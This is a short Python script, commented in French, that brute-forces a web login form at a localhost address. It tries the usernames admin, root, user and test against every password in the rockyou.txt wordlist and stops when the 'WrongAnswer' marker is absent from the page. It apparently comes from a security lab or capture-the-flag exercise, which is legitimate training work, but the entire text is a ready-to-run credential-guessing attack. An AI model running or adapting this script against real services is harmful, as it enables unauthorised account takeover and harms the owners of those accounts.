import requests

base_url = "http://localhost:8080/index.php"

users = ["admin", "root", "user", "test"]

# Chargement des mots de passe rockyou
passwords = []
with open("/home/anaouali/Downloads/rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        passwords.append(line.strip())

for user in users:
    for pwd in passwords:

        params = {
            "page": "signin",
            "username": user,
            "password": pwd,
            "Login": "Login"
        }

        r = requests.get(base_url, params=params)

        # Le site affiche WrongAnswer.gif quand c'est faux
        if "WrongAnswer" not in r.text:
            print(f"[OK] Trouvé → {user} / {pwd}")
            exit()

print("Aucune combinaison trouvée.")
